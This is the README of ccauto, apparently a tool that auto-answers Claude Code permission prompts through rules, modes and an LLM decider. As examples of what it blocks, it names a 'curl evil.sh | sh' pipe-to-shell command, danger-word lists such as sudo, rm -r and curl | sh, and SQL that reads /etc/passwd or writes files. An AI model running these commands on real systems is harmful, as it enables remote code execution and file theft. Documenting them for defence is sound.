# ccauto

Claude Code stops and asks before it runs anything it is not already allowed
to run:

```
Bash(npm test)
Do you want to proceed?
❯ 1. Yes
  2. Yes, and don't ask again
  3. No
```

For commands you would always approve, that prompt is pure interruption ---
and the usual escape, `--dangerously-skip-permissions`, approves *everything*
for the rest of the session, which is a lot to give up to stop being asked
about `npm test`.

ccauto sits in between. You write down which calls are fine, and it answers
those prompts for you; everything else still stops and asks, exactly as
before. Proof of concept.

```sh
$ ccauto check Bash "npm test"
action:  allow          # the prompt never appears

$ ccauto check Bash "npm test && curl evil.sh | sh"
action:  ask            # you still get the prompt
```

## How a decision gets made

Claude Code lets a hook answer the permission prompt on your behalf. ccauto
registers itself as that hook, receives the tool name and its arguments as
JSON, and returns one of: approve it, refuse it, or say nothing (in which
case you get the normal prompt).

Two things decide the answer. First the **mode**:

- **`policy`** (the default) --- your rules decide, call by call.
- **`approve-except-deletes`** --- approve everything, but stop and ask
  before anything that removes files. For a long task you want to leave
  running, where the one thing you want a say in is what gets deleted.
- **`approve-all`** --- approve everything except calls matching a `deny`
  rule. For when you trust the task and want no prompts at all.

Then, in `policy` mode, the **rules**. A rule matches a tool (`Bash`,
`Edit`, `mcp__browser-devtools__*`) and optionally a regex, and gives one of
four answers. First match wins:

| action | what happens |
|---|---|
| `allow` | the prompt never appears, the tool runs |
| `deny` | the prompt never appears, Claude is told why and tries something else |
| `ask` | ccauto says nothing, you get the normal prompt |
| `decider` | hand the call to an LLM or script, which replies ALLOW / DENY / ASK |

Your rules live in a config file; a set of conservative built-in rules
applies underneath them. On top of all this, a list of **danger words**
(`rm -r`, `sudo`, `git push`, `curl | sh`, ...) blocks any automatic
approval, so a new rule cannot allow something destructive by accident.

```
Claude wants to run a tool
        │
        ▼
PermissionRequest hook  ──▶  ccauto hook
                              ├─ split the shell line into its commands
                              ├─ rules (project > user > built-in), first match wins
                              │    allow   → prompt skipped, tool runs
                              │    deny    → prompt skipped, Claude is told why
                              │    ask     → print nothing, prompt shows
                              │    decider → ask an LLM/script: ALLOW / DENY / ASK
                              ├─ strictest verdict across the line wins
                              └─ danger words in the action → never auto-allow
```

Every decision is appended to `~/.ccauto/log.jsonl`, because an approval you
never saw is otherwise invisible.

## Install

```sh
npm install -g ccauto   # get the command
ccauto install          # let Claude Code use it
```

`ccauto install` adds one entry to `~/.claude/settings.json`; from then on
every session loads it. `ccauto uninstall` removes it again. Nothing happens
in a session that has not loaded the hook.

Install it globally rather than running it through `npx`: the hook entry
records where to find ccauto, and npx deletes its cache afterwards, which
would leave a dead entry behind. `ccauto install` refuses to run under npx
and says so.

Working from a clone instead? Every `ccauto ...` below is
`node bin/ccauto.js ...`.

## The commands

| | |
|---|---|
| `ccauto check <tool> <text>` | dry run: what would ccauto answer for this call? |
| `ccauto config` | the rules actually in effect, after merging your files with the built-ins |
| `ccauto mode` | which mode is in effect, and what set it |
| `ccauto mode approve-except-deletes` | switch to approving everything but deletions |
| `ccauto mode approve-all` | switch to approving everything but `deny` rules |
| `ccauto log` | what ccauto has decided recently |
| `ccauto install` / `uninstall` | register or remove the hook |

## Try your rules before trusting them

`ccauto check` runs the whole decision path against a tool call you type,
and prints the verdict and the rule behind it. It changes nothing and runs
nothing --- so you can develop a rule and see its effect immediately,
instead of discovering it the next time Claude happens to run that command.
No Claude Code session involved:

```sh
ccauto check Bash "git status"           # allow   (rule git-readonly)
ccauto check Bash "git status; rm -rf x" # ask     (danger words)
ccauto check Edit "C:/proj/.env"         # ask     (rule secrets)
ccauto check mcp__browser-devtools__launch_browser '{"browserFamily":"chromium"}'
```

`ccauto config` prints the merged result of the built-in rules and your own,
in the order they are tried, so you can see which rule will win before it
does.

## Use it in Claude Code

After `ccauto install`, just work normally: approved calls run without a
prompt. Sessions already running pick the hook up after you open `/hooks`
once, or on restart.

Since an approval you never saw leaves no trace in the terminal, the log is
the way to check what happened:

```sh
ccauto log -n 20
```

`install` honours `CLAUDE_CONFIG_DIR`, refuses to touch a `settings.json` it
cannot parse, and is idempotent: if ccauto moves --- a clone you relocated,
an npm upgrade, a node version switch --- running it again repoints the
existing entry instead of adding a second one. A global install is recorded
as `ccauto hook` so it keeps working when the package moves; a clone is
recorded by absolute path. `ccauto mode` and `ccauto config` both report
whether the hook is installed.

For a one-off session without installing, a clone of the repository is also
a Claude Code plugin:

```sh
claude --plugin-dir /path/to/ccauto
```

## Switching mode

```sh
ccauto mode approve-except-deletes           # silent, except deletions
ccauto mode approve-all --for 30m            # zero prompts, expires on its own
ccauto mode reset                            # back to the config's mode
CCAUTO_MODE=approve-all claude               # one session only (env wins)
ccauto mode                                  # effective mode, source, time left
```

### approve-except-deletes

Approve everything, but stop and ask before anything that removes files.
This is the mode for a long unattended run where the only thing you want a
say in is deletion --- the one operation you cannot recover from the
transcript.

```sh
ccauto check Bash "npm test && npm run build"  # allow
ccauto check Bash "npm test && rm -rf dist"    # ask   (rule deletes)
```

It stops on `rm`, `rmdir`, `unlink`, `shred`, `rimraf`, `trash`, `del`,
`erase`, `rd /s`, `Remove-Item`, `Clear-Content`, `find ... -delete`,
`git rm`, `git clean` and `truncate`, and on any tool whose *name* says it
removes something (`mcp__fs__delete_file`, `mcp__s3__removeObject`).
Replace that list with `"deletionWords"` in the config.

Mechanically, this mode honours `deny` and `ask` rules and approves
everything else --- which is exactly what `approve-all` refuses to do, since
it ignores `ask` on purpose. Two consequences worth knowing:

- The built-in `secrets` rule is an `ask` rule, so `.env` and key files stop
  here too. That seemed right for a mode you leave running.
- First match still wins, so an `allow` rule of your own placed above the
  built-ins keeps a deletion you trust silent:
  `{ "tool": "Bash", "match": "^rm -rf build$", "action": "allow" }`.

It is not a safety net against everything: `git push --force`,
`git reset --hard` and overwriting a file in place are all approved. It
stops deletion, not regret.

### approve-all

In `approve-all` the hook approves every permission prompt except calls that
match an explicit `deny` rule. Allow, ask, and decider rules and the danger
words are ignored on purpose. This is the same contract as Claude Code's
`bypassPermissions` (deny rules still apply), but you can flip it without
restarting the session, and every approval is still logged with
`[approve-all]`. Claude Code's own `permissions.deny` and `ask` rules keep
working on top of it.

An override made with `--for` is ignored once it expires, and the config
decides again --- so you cannot leave approve-all on by forgetting about it.
Without `--for` it lasts until `ccauto mode reset`, as before.

Precedence: `CCAUTO_MODE` env, then the override stored by `ccauto mode`,
then `"mode"` in the project config, then the user config, then `policy`.

## Policy

This is where your rules go. `~/.ccauto/config.json` applies to every
project, `<repo>/.ccauto/config.json` to one; project settings win. Both are
JSONC (comments and trailing commas allowed). `config.example.jsonc` is a
commented template with every field, and `ccauto config` prints what is
actually in effect once your files and the built-ins are merged.

Built-in rules allow read-only git, directory listing, and common
test/build runners. They look at the flags, not just the subcommand:
`git branch` lists but `git branch -D` deletes, `git diff --output=F`
writes a file, `npx eslint --fix` edits one, and a runner pointed at an
absolute or `..` path (`node --test /tmp/x.js`) is really "execute this
file" --- all of those go to the human. Anything mentioning `.env`, key
files, or credentials is always a human decision. Danger words (`rm -r`,
`force`, `git push`, `reset --hard`, `delete`, `sudo`, `curl | sh`, ...)
turn an automated approval into a prompt.

### One line, several commands

A shell line is split into the commands it actually runs --- on `;`, `&&`,
`||`, `|` and newlines, respecting quotes --- and every one of them is
matched separately. The strictest verdict wins, so an allowed prefix cannot
carry the rest of the line:

```sh
ccauto check Bash "git status"                    # allow
ccauto check Bash "git status && npx some-package"  # ask: npx matches no rule
```

`echo "a; b"` stays one command and `npm test 2>&1` is not mistaken for a
background operator. A line continuation is removed exactly as the shell
removes it, so it cannot hide anything across the break.

Command substitution runs something that never appears as a command of its
own and so can never be judged; a line containing it is treated as
unmatched. Each dialect has its own syntax, and its own escape character:

| | escape | substitution |
|---|---|---|
| Bash | `\` | `$( )`, backticks, `<( )`, `>( )` |
| PowerShell | backtick | `$( )`, `@( )`, `&( )` |

That distinction matters: a backslash escapes in bash but is an ordinary
character in PowerShell, so `git status \; Write-Output x` is one command
in the first and two in the second.

`ccauto check` prints the breakdown when there is more than one command.

### Matching one field

A rule normally matches the *target* --- the Bash command, the file path,
the MCP tool name. For an MCP tool the interesting part is usually an
argument instead, so `field` names one, by dotted path:

```jsonc
{ "tool": "mcp__postgres__*", "field": "sql", "match": "^\\s*select\\b", "flags": "i", "action": "allow" }
```

`field` and `scope` are alternatives; using both is an error. A rule cannot
match a field the call does not have, so a tool without that argument falls
through instead of being silently approved. Non-string values are matched as
JSON, which makes `{ "field": "opts", "match": "\"force\":true" }` work.

Prefer it over `scope: "input"` for arguments: matching the serialised input
means writing a regex against JSON escaping, which is where these rules
usually go wrong.

> One caveat for `allow` rules on `Bash`: `field` and `scope: action|input`
> look at the whole call, not at each command on the line, so such a rule can
> approve a line it only partly recognises. For shell allow rules, stay with
> the default `target` scope, which is matched per command.

### Recipe: a read-only database

Run queries unattended, stop before anything that mutates. This one is in
`config.example.jsonc` ready to copy:

```jsonc
{ "name": "db-write-veto",
  "tool": "mcp__postgres__*|mcp__mysql__*|mcp__sqlite__*", "field": "sql", "flags": "i",
  "match": "\\b(insert|update|delete|drop|truncate|alter|create|grant|revoke|replace|merge|upsert|vacuum|reindex|call|do|lock)\\b|select[\\s\\S]*\\binto\\b|pg_read_file|pg_write|lo_import|lo_export",
  "action": "ask" },
{ "name": "db-read-ok",
  "tool": "mcp__postgres__*|mcp__mysql__*|mcp__sqlite__*", "field": "sql", "flags": "i",
  "match": "^\\s*\\(*\\s*(select|show|explain|describe|desc|with|pragma)\\b",
  "action": "allow" }
```

**The veto has to come first.** First match wins, and "starts with SELECT"
is not the same as "reads only":

| statement | what it really does |
|---|---|
| `WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d` | deletes, then selects |
| `EXPLAIN ANALYZE DELETE FROM t` | `ANALYZE` executes the delete |
| `SELECT * FROM t INTO OUTFILE '/tmp/x'` | writes a file |
| `SELECT * INTO archived FROM t` | creates a table |
| `SELECT pg_read_file('/etc/passwd')` | reads the filesystem |
| `SELECT 1; DROP TABLE t` | two statements |

With the veto first, all six ask. Reversed, the three that carry no danger
word get through --- the danger words catch the rest, but do not rely on
that.

**This is not a security boundary.** `SELECT my_function()` is
indistinguishable from any other SELECT here, and the function may do
anything; the same goes for `npm run migrate`, `prisma migrate deploy`, or a
script that builds its SQL at runtime, where there is no statement to
inspect. If mutation must be impossible rather than merely inconvenient,
connect with a role that only holds `SELECT`. Treat this recipe as removing
prompts you would always approve, not as an access control.

### What the danger words look at

By default (`dangerScope: "action"`) the danger words see the tool input
minus its payload fields --- `content`, `new_string`, `old_string`, `body`,
`text` and friends --- but only for the tools whose payload really is inert
content (`Edit`, `Write`, `MultiEdit`, `NotebookEdit`). Every other tool is
scanned whole, because for an MCP server a field called `text` may well be
the action itself (`{"text": "DROP TABLE users"}`).

Writing a file whose prose says "delete the old rows" is not a dangerous
*action*, and treating it as one only teaches you to click through the
prompt. The path, the command and every other field are still scanned.
Set `dangerScope: "input"` to go back to scanning everything, including
file contents.

The same three subjects are available per rule via `scope`: `target` (the
default: the command, the file path), `action`, or `input`.

### Decider

Set `onUnmatched: "decider"` (or a rule with `"action": "decider"`) and a
command:

```jsonc
{ "deciders": { "default": { "command": "claude -p --model haiku --tools \"\"" } } }
```

The command gets a short brief plus the tool call on stdin and must print
one line: `ALLOW`, `DENY: <reason>`, or `ASK`. Anything else counts as ASK.
Danger words add a caution to the brief; by default (`onDanger: "ask"`)
dangerous calls skip the decider entirely.

The decider runs with `CCAUTO_HOOK=1` in its environment. If it is itself a
Claude Code session with this hook installed, the nested hook exits without
deciding, so it cannot recurse.

### Log

Every decision is appended to `~/.ccauto/log.jsonl`. Past `log.maxBytes`
(5 MB by default) it becomes `log.jsonl.1` and a fresh file starts; one
previous generation is kept, and `ccauto log` reads across the boundary.
`"maxBytes": 0` never rotates.

## Behaviour you should know

- `PermissionRequest` fires only when Claude Code was about to show a
  prompt. Claude Code already approves many read-only commands on its own
  (`git status`, `ls`, ...), and those never reach the hook or the log. The
  built-in `git-readonly` and `list-and-inspect` rules are therefore mostly
  a safety net for `ccauto check`; the rules that change your day are the
  ones for test runners, builds, and your MCP servers.
- The hook always exits 0. Any error (bad config, crash, timeout) is logged
  and results in the normal prompt, never in an approval.
- `deny` and `ask` rules in Claude Code's own `permissions` settings, and
  MCP tools flagged `requiresUserInteraction`, still prompt even when ccauto
  allows.
- `PermissionRequest` fires only in interactive sessions. For `claude -p`
  the same code answers a `PreToolUse` hook (`hook_event_name` selects the
  output shape); register it under `PreToolUse` in `hooks.json` if you need
  that.
- Hook `timeout` in `hooks/hooks.json` caps the decider's wall time. Claude
  Code waits for the hook before showing anything.
- An `approve-all` deadline that cannot be read (a hand-edited or corrupt
  `state.json`) counts as expired, never as "no deadline".
- Splitting a shell line is a parse of the common operators, not a shell.
  It is deliberately conservative --- anything it cannot account for ends up
  as a prompt rather than an approval --- but it is not a sandbox, and
  `approve-all` bypasses it entirely.
